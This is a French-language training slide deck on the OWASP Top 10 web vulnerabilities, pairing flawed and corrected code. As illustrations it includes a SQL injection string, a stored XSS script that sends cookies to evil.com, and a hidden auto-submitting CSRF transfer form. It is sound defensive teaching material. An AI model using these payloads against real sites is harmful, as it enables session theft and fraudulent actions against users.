---
layout: new-section
routeAlias: 'owasp-top10'
---

<a name="owasp-top10" id="owasp-top10"></a>

# 🛡️ Module 3
## OWASP Top 10 (2025)

### Les 10 vulnérabilités web les plus critiques

---

# Qu'est-ce que l'OWASP ? 🌐

**OWASP** = Open Worldwide Application Security Project

- Organisation à but non lucratif
- Référence mondiale en sécurité applicative
- Publie le **Top 10** des vulnérabilités web les plus critiques
- Mis à jour régulièrement (dernière version : 2021, mise à jour en cours pour 2025)

---

# OWASP Top 10 - Vue d'ensemble 📊

<div class="text-xs">

| # | Vulnérabilité |
|---|--------------|
| A01 | Broken Access Control |
| A02 | Cryptographic Failures |
| A03 | Injection |
| A04 | Insecure Design |
| A05 | Security Misconfiguration |
| A06 | Vulnerable Components |
| A07 | Authentication Failures |
| A08 | Software & Data Integrity Failures |
| A09 | Security Logging Failures |
| A10 | Server-Side Request Forgery (SSRF) |

</div>

---

# A01 - Broken Access Control 🚪

**Le problème :** Un utilisateur accède à des ressources qui ne lui sont pas destinées.

**Exemples :**
- IDOR : `/api/users/123/profile` → changer 123 par 456
- Accès admin sans vérification de rôle
- Manipulation d'URL pour contourner les restrictions

---

# A01 - Remédiation

```javascript
// ❌ MAUVAIS : pas de vérification d'ownership
app.get('/api/users/:id/profile', (req, res) => {
  const user = db.getUser(req.params.id)
  res.json(user)
})
```

---

# A01 - Remédiation (code corrigé)

```javascript
// ✅ BON : vérification d'ownership
app.get('/api/users/:id/profile', auth, (req, res) => {
  if (req.user.id !== req.params.id
      && req.user.role !== 'admin') {
    return res.status(403).json({
      error: 'Accès non autorisé'
    })
  }
  const user = db.getUser(req.params.id)
  res.json(user)
})
```

---

# A02 - Cryptographic Failures 🔑

**Le problème :** Données sensibles non chiffrées ou mal chiffrées.

**Exemples courants :**
- Mots de passe stockés en clair ou en MD5
- Communication HTTP au lieu de HTTPS
- Clés de chiffrement faibles ou codées en dur
- Données personnelles non chiffrées en base

**Remédiation :**
- Bcrypt/Argon2 pour les mots de passe
- TLS 1.3 minimum
- AES-256 pour le chiffrement au repos
- Rotation régulière des clés

---

# A03 - Injection 💉

**Le problème :** Des données non fiables sont envoyées à un interpréteur.

**Types d'injection :**
- SQL Injection
- NoSQL Injection
- Command Injection
- LDAP Injection

---

# A03 - Injection SQL : Exemple

```sql
-- L'utilisateur saisit : ' OR '1'='1' --
SELECT * FROM users
WHERE username = '' OR '1'='1' --'
AND password = 'anything'
-- Résultat : accès à TOUS les utilisateurs !
```

---

# A03 - Remédiation

```javascript
// ❌ MAUVAIS : concaténation de strings
const query = `SELECT * FROM users
  WHERE username = '${username}'`

// ✅ BON : requêtes paramétrées
const query = 'SELECT * FROM users WHERE username = ?'
db.query(query, [username])
```

---

# A04 - Insecure Design 🏗️

**Le problème :** Failles de conception, pas de bugs d'implémentation.

**Exemples :**
- Pas de rate limiting sur la récupération de mot de passe
- Question secrète comme seul facteur de récupération
- Pas de validation côté serveur (uniquement côté client)

**Remédiation :**
- Threat Modeling dès la conception
- Security by Design
- Revue d'architecture par un expert sécurité
- Principes de moindre privilège

---

# A05 - Security Misconfiguration ⚙️

**Le problème :** Configuration par défaut ou incorrecte.

**Exemples :**
- Headers HTTP manquants (CORS trop permissif)
- Mode debug activé en production
- Comptes par défaut non désactivés
- Permissions de fichiers trop larges

---

# A05 - Headers HTTP de sécurité

```
# Headers à configurer systématiquement
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=()
```

---

# A06 - Vulnerable Components 📦

**Le problème :** Utilisation de bibliothèques avec des vulnérabilités connues.

**Exemples célèbres :**
- Log4Shell (Log4j) - décembre 2021
- Polyfill.io supply chain attack - 2024
- Event-Stream malware - npm

**Remédiation :**
- `npm audit` / `yarn audit` régulier
- Dependabot / Renovate pour les mises à jour
- Software Bill of Materials (SBOM)
- Vérification des licences

---

# A07 - Authentication Failures 🔒

**Le problème :** Mécanismes d'authentification faibles.

**Vulnérabilités courantes :**
- Pas de protection contre le brute force
- Mots de passe faibles acceptés
- Session fixation
- Tokens JWT mal configurés

**Remédiation :**
- MFA (Multi-Factor Authentication)
- Rate limiting sur le login
- Politique de mots de passe robuste
- Rotation des tokens

---

# XSS - Cross-Site Scripting 🕷️

**Le problème :** Du code JavaScript malveillant est exécuté dans le navigateur de la victime.

**3 types de XSS :**
- **Stored (stocké)** : le script est sauvegardé en BDD (commentaire, profil)
- **Reflected (réfléchi)** : le script est dans l'URL
- **DOM-based** : le script manipule le DOM côté client

```html
<!-- Exemple de XSS stocké -->
<!-- L'attaquant poste un commentaire : -->
<script>
  fetch('https://evil.com/steal?cookie='
    + document.cookie)
</script>
<!-- Tous les visiteurs exécutent ce script ! -->
```

---

# XSS - Remédiation

```javascript
// ❌ MAUVAIS : injection directe dans le DOM
element.innerHTML = userInput

// ✅ BON : utiliser textContent
element.textContent = userInput

// ✅ BON : sanitizer côté serveur (DOMPurify)
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(userInput)

// ✅ BON : Content Security Policy
// Header HTTP :
// Content-Security-Policy: script-src 'self'
```

---

# CSRF - Cross-Site Request Forgery 🎭

**Le problème :** L'attaquant force un utilisateur authentifié à exécuter une action à son insu.

**Scénario :**
1. L'utilisateur est connecté à sa banque
2. Il visite un site malveillant
3. Le site contient un formulaire caché qui fait un virement

```html
<!-- Sur le site malveillant -->
<form action="https://banque.com/transfer" method="POST">
  <input type="hidden" name="to" value="attaquant">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

---

# CSRF - Remédiation

```javascript
// ✅ Token CSRF (synchronizer token)
// Le serveur génère un token unique par session
app.use(csrf())

// Dans le formulaire HTML :
// <input type="hidden" name="_csrf" value="TOKEN">

// ✅ SameSite Cookie
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // ou 'lax'
})

// ✅ Vérifier le header Origin/Referer
if (req.headers.origin !== 'https://monsite.com') {
  return res.status(403).json({ error: 'CSRF detected' })
}
```

---

# A08 à A10 - En bref 📋

**A08 - Software & Data Integrity Failures :**
- Mises à jour non vérifiées (pas de signature)
- CI/CD non sécurisée
- Désérialisation non sécurisée

**A09 - Security Logging Failures :**
- Pas de logs d'authentification
- Logs non centralisés
- Pas d'alerting sur les anomalies

**A10 - SSRF (Server-Side Request Forgery) :**
- Le serveur fait des requêtes vers des URLs contrôlées par l'attaquant
- Accès aux métadonnées cloud (169.254.169.254)
- Scan du réseau interne

---

# En résumé : OWASP Top 10 📝

- Le Top 10 est un **standard de référence** pour la sécurité web
- **Broken Access Control** est la vulnérabilité #1
- Les **injections** restent un risque majeur
- La **misconfiguration** est souvent négligée
- Les **dépendances** sont un vecteur d'attaque important
- **Formez-vous** et testez régulièrement votre application
